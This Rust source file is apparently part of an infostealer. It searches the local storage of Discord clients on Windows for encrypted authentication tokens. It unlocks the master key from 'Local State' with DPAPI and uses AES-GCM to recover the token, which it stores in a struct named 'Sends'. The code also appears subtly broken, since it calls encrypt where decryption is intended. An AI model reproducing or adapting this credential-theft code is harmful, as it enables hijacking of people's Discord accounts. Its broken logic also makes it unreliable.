use crate::Sends;
use std::env;
use std::path::PathBuf;
use std::fs;
use std::ffi::OsStr;
use regex::bytes::Regex;
use serde_json::Value;
use winapi::um::dpapi::CryptUnprotectData;
use std::ptr::null_mut;
use winapi::um::wincrypt::CRYPTOAPI_BLOB;
use std::slice;
use winapi::um::winbase::LocalFree;
use winapi::ctypes::c_void;
use aes_gcm::{Aes256Gcm, KeyInit, Nonce, aead::Aead};

impl Sends {
    #[cfg(feature = "discord-client")]
    pub fn discord_client(&mut self) -> Option<()> {
        for i in &["discord", "discordcanary", "Litecord", "discordptb"] {
            let mut path = PathBuf::from(env::var("appdata").unwrap());
            for x in &[i, "Local Storage", "leveldb"] {
                path.push(x);
            }
            match fs::read_dir(path.clone()) {
                Ok(x) => {
                    for ldb in x {
                        let path_ldb = ldb.unwrap().path();
                        if path_ldb.extension() == Some(OsStr::new("ldb")) {
                            let contents = fs::read(path_ldb).unwrap();
                            let re = Regex::new("dQw4w9WgXcQ:([^\"]*)").unwrap();
                            let caps = re.captures(&contents).unwrap();
                            let asm = base64::decode(&caps[1]).unwrap();
                            path.pop();
                            path.pop();
                            path.push("Local State");
                            let local_state = fs::read_to_string(path).unwrap();
                            let local_state: Value = serde_json::from_str(&local_state).unwrap();
                            let mut key = base64::decode(local_state["os_crypt"]["encrypted_key"].as_str().unwrap()).unwrap();
                            let key = &mut key[5..];
                            let mut data_in = CRYPTOAPI_BLOB {
                                cbData: key.len() as u32,
                                pbData: key.as_mut_ptr(),
                            };
                            let mut data_out = CRYPTOAPI_BLOB {
                                cbData: 0,
                                pbData: null_mut()
                            };
                            let master_key;
                            unsafe {
                                CryptUnprotectData(&mut data_in, null_mut(), null_mut(), null_mut(), null_mut(), 0, &mut data_out);
                                master_key = slice::from_raw_parts(data_out.pbData, data_out.cbData as usize).to_vec();
                                LocalFree(data_out.pbData as *mut c_void);
                            }
                            let iv = &asm.clone()[3..15];
                            let payload = &asm.clone()[15..];
                            let cipher = Aes256Gcm::new_from_slice(&master_key).unwrap();
                            let decrypted = cipher.encrypt(Nonce::from_slice(iv), payload);
                            let token = decrypted.unwrap();
                            let token = token.split(|y| *y == 249).collect::<Vec<_>>()[0];
                            self.discord_client_toke = Some(String::from_utf8(token.to_vec()));
                            break;
                        }
                    }
                },
                Err(_) => {}
            }
        }
        Some(())
    }
}
